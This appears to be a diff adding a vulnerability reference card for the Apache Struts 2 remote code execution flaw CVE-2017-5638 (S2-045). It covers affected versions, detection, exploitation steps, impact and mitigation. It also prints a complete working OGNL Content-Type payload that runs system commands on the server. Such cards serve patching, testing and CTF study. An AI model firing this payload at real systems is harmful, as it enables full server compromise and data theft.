@@ -1,0 +1,49 @@
+Service: Apache Struts
+CVE: CVE-2017-5638
+
+Summary:
+- Remote Code Execution vulnerability in Apache Struts 2
+- Exploits the Jakarta Multipart parser by injecting malicious OGNL expressions in the Content-Type header
+- Allows execution of arbitrary system commands on the server
+
+Affected Versions:
+- Struts 2.3.5 through 2.3.31
+- Struts 2.5 through 2.5.10
+
+Prerequisites:
+- Struts application exposed to the internet
+- File upload functionality using Jakarta Multipart parser
+
+Detection:
+- Struts framework detected (check HTTP headers, error pages, or known endpoints)
+- Error messages referencing OGNL (Object-Graph Navigation Language)
+- Vulnerable versions in use
+
+Exploitation Steps:
+1. Send a POST request with a malicious Content-Type header containing OGNL expression
+2. The expression is evaluated by the Jakarta parser
+3. Commands execute on the server
+
+Example Exploitation:
+- Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+Impact:
+- Full remote code execution
+- Complete compromise of the application server
+- Potential for data exfiltration or further attacks
+
+Mitigation:
+- Upgrade Struts to 2.3.32 or 2.5.10.1 or later
+- Apply security patches
+- Use input validation and sanitization
+- Disable file uploads if not needed
+
+References:
+- https://cwiki.apache.org/confluence/display/WW/S2-045
+- NIST CVE details
+- Exploit-DB
+
+Notes:
+- Also known as S2-045
+- Common in CTF challenges and vulnerable web applications
+- Requires careful payload crafting
